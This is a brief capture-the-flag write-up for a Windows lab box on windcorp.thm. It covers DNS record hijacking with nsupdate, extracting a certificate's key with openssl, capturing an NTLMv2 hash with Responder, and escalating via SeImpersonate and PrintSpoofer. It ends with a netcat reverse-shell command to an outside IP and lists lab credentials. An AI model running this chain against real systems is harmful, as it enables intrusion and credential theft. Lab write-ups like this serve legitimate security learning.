windows machine, web port is open and had insecure certificate which showed two subdomains
smb shows nothing(need creds)

selfservice.windcorp.thm(http basic auth) and selfservice.dev.windcorp.thm

possible usernames from images: "Emilieje","lilyle" and "kirkug"

selfservice.dev has /backup with a cert(password protected:"ganteng") and config file(404 not found).
fire.windcorp.thm has /powershell that gives web-based control with creds

It's always DNS, check with dnsrecon(didn't work for me:/) and nslookup
and see the txt record, we can modify the records with nsupdate, so we delete selfservice, and 
update it with an A record to our tun0 ip so all requests are made to us(intercepted with responder)
but we need to provide valid certificates to get requests which can be extracted from the cert.pfx file

`openssl pkcs12 -in ~/Downloads/cert.pfx -out selfservice.crt.pem -clcerts -nokeys` \\for crt file 
`openssl pkcs12 -in ~/Downloads/cert.pfx -out selfservice.key.pem -nocerts -nodes`  \\for key file
then specify the files for responder in '/etc/responder/Responder.conf' in SSLCert and SSLKey respectively.

we capture NTLMv2 hash for edwardle, which gives the following creds
`edwardle:!Angelus25!`
logging into /powershell and checking privs we have SeImpersonate Privilege which can be exploited with
sweetpotato and printspoofer.

Sweetpotato didn't work for me properly(maybe some error in compiling the binary?) but getting the binary for
printspoofer worked albeit a bit indirectly, the createuserprocess gave an error, so `spoofer.exe -i -c cmd`
didn't work but the command exected with `-i` omiited, so `spoofer.exe -c "nc.exe -e cmd 10.17.17.11 443" worked

